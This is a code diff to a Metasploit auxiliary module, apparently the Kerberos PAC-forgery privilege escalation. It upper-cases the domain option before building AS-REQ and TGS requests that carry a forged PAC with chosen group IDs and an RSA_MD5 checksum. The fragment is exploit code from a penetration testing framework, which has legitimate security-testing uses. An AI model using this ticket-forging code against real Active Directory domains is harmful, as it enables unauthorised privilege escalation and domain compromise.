@@ -45,7 +45,7 @@ class Metasploit4 < Msf::Auxiliary
       [
         OptString.new('USER', [ true, 'The Domain User' ]),
         OptString.new('PASSWORD', [ true, 'The Domain User password' ]),
-        OptString.new('DOMAIN', [ true, 'The Domain Ex: DEMO.LOCAL' ]),
+        OptString.new('DOMAIN', [ true, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),
         OptString.new('USER_SID', [ true, 'The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000'])
       ], self.class)
   end
@@ -57,6 +57,10 @@ class Metasploit4 < Msf::Auxiliary
       print_error("Invalid USER_SID. Ex: S-1-5-21-1755879683-3641577184-3486455962-1000")
       return
     end
+
+    domain = datastore['DOMAIN'].upcase
+
+    print_status("Using domain #{domain}...")
 
     user_sid_arr = datastore['USER_SID'].split('-')
     domain_sid = user_sid_arr[0, user_sid_arr.length - 1].join('-')
@@ -76,8 +80,8 @@ class Metasploit4 < Msf::Auxiliary
     print_status("#{peer} - Sending AS-REQ...")
     res = send_request_as(
       client_name: "#{datastore['USER']}",
-      server_name: "krbtgt/#{datastore['DOMAIN']}",
-      realm: "#{datastore['DOMAIN']}",
+      server_name: "krbtgt/#{domain}",
+      realm: "#{domain}",
       key: password_digest,
       pa_data: pre_auth
     )
@@ -109,7 +113,7 @@ class Metasploit4 < Msf::Auxiliary
       group_ids: groups,
       domain_id: domain_sid,
       user_id: user_rid,
-      realm: datastore['DOMAIN'],
+      realm: domain,
       logon_time: logon_time,
       checksum_type: Rex::Proto::Kerberos::Crypto::RSA_MD5
     )
@@ -121,8 +125,8 @@ class Metasploit4 < Msf::Auxiliary
 
     res = send_request_tgs(
       client_name: datastore['USER'],
-      server_name: "krbtgt/#{datastore['DOMAIN']}",
-      realm: datastore['DOMAIN'],
+      server_name: "krbtgt/#{domain}",
+      realm: domain,
       session_key: session_key,
       ticket: ticket,
       auth_data: auth_data,
